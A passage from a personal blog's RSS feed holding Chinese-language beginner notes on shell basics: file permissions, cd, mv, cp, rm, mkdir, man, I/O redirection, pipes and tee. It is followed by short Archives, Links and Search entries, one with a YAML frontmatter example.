&lt;p>在某些条目的开头的 &amp;ldquo;d&amp;rdquo; 表示这些条目是一个目录，因此我们可知道 &lt;code>'Camera Roll'&lt;/code> 条目 是一个目录，而 &lt;code>desktop.ini&lt;/code> 是一个文件。
之后的9个字母表示该文件或目录的权限：有 &amp;ldquo;r&amp;rdquo; 意思是读取权限，有 &amp;ldquo;w&amp;rdquo; 意思是写入权限，有 &amp;ldquo;x&amp;rdquo; 意思是执行权限。&lt;/p>
&lt;p>如 &lt;code>r-x&lt;/code> 意思是你拥有读取与执行权限，但没有写入权限。
而对目录来说，这些权限含义&lt;/p>
&lt;ul>
&lt;li>读取 -&amp;gt; 查看目录的文件列表&lt;/li>
&lt;li>写入 -&amp;gt; 在目录中&lt;strong>创造、重命名、删除&lt;/strong>文件。
（如果你有文件 &lt;code>/usr/bin/programA/config.yoml&lt;/code> 的写入权限，但没有目录 &lt;code>/usr/bin/programA&lt;/code> 的写入权限，这意味着你可以对 该yoml本身内容进行操作，却不能重命名它、或者删除它）&lt;/li>
&lt;li>执行 -&amp;gt; &amp;ldquo;搜索&amp;quot;权限，是否允许进入该目录。如果你要进入一个目录，你需要在 &lt;strong>该目录及其所有的直系父目录上&lt;/strong> 都拥有执行权限&lt;/li>
&lt;/ul>
&lt;p>前三个字符是为文件所有者（这里是Azusaislit）所设置的权限
中间三个字符是为拥有该文件的组设置的权限
最后三个字符是其他人的权限列表&lt;/p>
&lt;p>对于 &lt;code>cd&lt;/code> 命令有两个特殊符号较常用：&lt;/p>
&lt;ul>
&lt;li>&lt;code>cd ~&lt;/code> 将切换到主目录（不是根目录）&lt;/li>
&lt;li>&lt;code>cd -&lt;/code> 将切换到你之前所在的目录&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://s2.loli.net/2023/11/19/62JwVCykbcAdvZI.png"
loading="lazy"
alt="几个常用的cd命令技巧"
>&lt;/p>
&lt;p>如图，通过 &lt;code>cd -&lt;/code> 我们实现了在 &lt;code>~/pictures&lt;/code> 与 &lt;code>~&lt;/code> 之间相互切换&lt;/p>
&lt;h2 id="mv-cp-rm-mkdir-man-指令">mv cp rm mkdir man 指令
&lt;/h2>&lt;p>&lt;code>mv&lt;/code> 命令可以 &lt;strong>移动文件&lt;/strong> ，也可以 &lt;strong>重命名文件&lt;/strong>&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2023/11/19/mN8bkKRiJwUf2T7.png"
loading="lazy"
alt="mv命令移动文件"
>&lt;/p>
&lt;p>利用 &lt;code>mv&lt;/code> 命令将当前所在路径下的一个 &lt;code>broke.txt&lt;/code> 重命名为 &lt;code>up.txt&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2023/11/19/JEH3Qh2IpO7Ccwm.png"
loading="lazy"
alt="mv命令重命名文件"
>&lt;/p>
&lt;p>利用 &lt;code>mv&lt;/code> 命令将位于 &lt;code>D:\ST2&lt;/code> 的 &lt;code>hello.txt&lt;/code> 转移到 &lt;code>D:\Shell_test&lt;/code> 目录&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2023/11/19/kCUgRBhw8GOezal.png"
loading="lazy"
alt="mv命令重命名同时移动文件"
>&lt;/p>
&lt;p>同样 &lt;strong>重命名&lt;/strong> 和 &lt;strong>移动&lt;/strong> 操作 &lt;strong>可以同时进行&lt;/strong>&lt;/p>
&lt;p>还有 &lt;code>cp&lt;/code> 命令可用于复制文件，用法类似 &lt;code>mv&lt;/code> ，也可以用来重命名文件&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2023/11/19/OuSvPKxQ82cDid3.png"
loading="lazy"
alt="cp命令复制并重命名文件"
>&lt;/p>
&lt;p>&lt;code>rm&lt;/code> 命令可以用来删除文件，但在Linux上删除不会递归进行，因此不能用于删除目录。通常使用 &lt;code>rm -r&lt;/code> 或者 &lt;code>rmdir&lt;/code> 命令用于删除目录，但后者只能删除空目录。&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2023/11/19/iGFKaTx3zy4e6Xm.png"
loading="lazy"
alt="rm命令删除文件"
>&lt;/p>
&lt;p>&lt;code>mkdir&lt;/code> 命令用于创建目录。如果你要创建一个名为 &lt;code>My Photo&lt;/code> 的目录，您要么用使用单引号&lt;code>'My Photos'&lt;/code>，双引号将其包裹起来 &lt;code>&amp;quot;My Photos&amp;quot;&lt;/code> ，要么使用转义符号 &lt;code>\&lt;/code> 进行处理（&lt;code>My\ Photos&lt;/code>）。&lt;/p>
&lt;p>&lt;code>man&lt;/code> 程序以另一个程序作为参数，并给出作为参数的程序的 manual pages。这比 &amp;ndash;help 指令通常更为实用。（Windows的bash不可用）&lt;/p>
&lt;p>&lt;code>Ctrl + L&lt;/code> 是 &lt;code>cls&lt;/code> (Windows cmd) 或 &lt;code>clear&lt;/code> (Bash Shell) 的快捷键&lt;/p>
&lt;h2 id="io重定向">IO重定向
&lt;/h2>&lt;p>在 shell 中，程序有两个主要的“流”：它们的输入流和输出流。 当程序尝试读取信息时，它们会从输入流中进行读取，当程序打印信息时，它们会将信息输出到输出流中。 通常，一个程序的输入输出流都是您的终端。也就是，您的键盘作为输入，显示器作为输出。 但是，我们也可以重定向这些流！&lt;/p>
&lt;p>最简单的重定向是 &lt;code>&amp;lt; file&lt;/code> ：表示将要运行的程序的输入重定向为 &lt;code>file&lt;/code> 文件的内容（&lt;code>file&lt;/code> 代替输入）
和 &lt;code>&amp;gt; file&lt;/code> ：表示将程序的输出重定向到 &lt;code>file&lt;/code> 文件中（将 &lt;code>file&lt;/code> 用于输出结果）&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2023/11/19/yeQAnZ4rvYzRmNC.png"
loading="lazy"
alt="ioredirect1"
>&lt;/p>
&lt;p>&lt;code>cat&lt;/code> 命令的作用是打印文件的内容。我们可以看到 &lt;code>echo&lt;/code> 命令的结果被写入到 &lt;code>hello.txt&lt;/code> 中了。&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2023/11/19/Ii6wtaOXDWv9MY4.png"
loading="lazy"
alt="ioredirect2"
>&lt;/p>
&lt;p>利用 &lt;code>cat&lt;/code> 命令也重定向输入输出：从 &lt;code>hello.txt&lt;/code> 读取内容，并输出在 &lt;code>hate.txt&lt;/code> 中。最后一个 &lt;code>cat&lt;/code> 命令中输出没有重定向，其内容默认输出在终端上。&lt;/p>
&lt;p>&lt;code>|&lt;/code> 操作符允许我们将一个程序的输出和另外一个程序的输入连接起来: &lt;code>A | B&lt;/code> 即将 A 程序的输出作为 B程序的输入。&lt;code>|&lt;/code> 的使用可以嵌套。
``
&lt;code>tail&lt;/code>&lt;/p>
&lt;p>&lt;code>sudo su&lt;/code> 将终端切换到 ROOT终端&lt;/p>
&lt;p>&lt;code>tee&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">echo 1060 | sudo tee brightness
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>或者&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">sudo su
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">echi 1060 &amp;gt; brightness
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>find&lt;/code> 文件&lt;/p>
&lt;p>&lt;code>xdg-open file&lt;/code> 命令可以用合适的程序打开 &lt;code>file&lt;/code> 文件。&lt;/p></description></item><item><title>Archives</title><link>https://nepl1t.github.io/archives/</link><pubDate>Sun, 06 Mar 2022 00:00:00 +0000</pubDate><guid>https://nepl1t.github.io/archives/</guid><description/></item><item><title>Links</title><link>https://nepl1t.github.io/links/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://nepl1t.github.io/links/</guid><description>&lt;p>To use this feature, add &lt;code>links&lt;/code> section to frontmatter.&lt;/p>
&lt;p>This page&amp;rsquo;s frontmatter:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="line">&lt;span class="cl">&lt;span class="nt">links&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">title&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">GitHub&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">description&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">GitHub is the world&amp;#39;s largest software development platform.&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">website&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">https://github.com&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">title&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">TypeScript&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">description&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">TypeScript is a typed superset of JavaScript that compiles to plain JavaScript.&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">website&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">https://www.typescriptlang.org&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ts-logo-128.jpg&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>image&lt;/code> field accepts both local and external images.&lt;/p></description></item><item><title>Search</title><link>https://nepl1t.github.io/search/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://nepl1t.github.io/search/</guid><description/></item></channel></rss>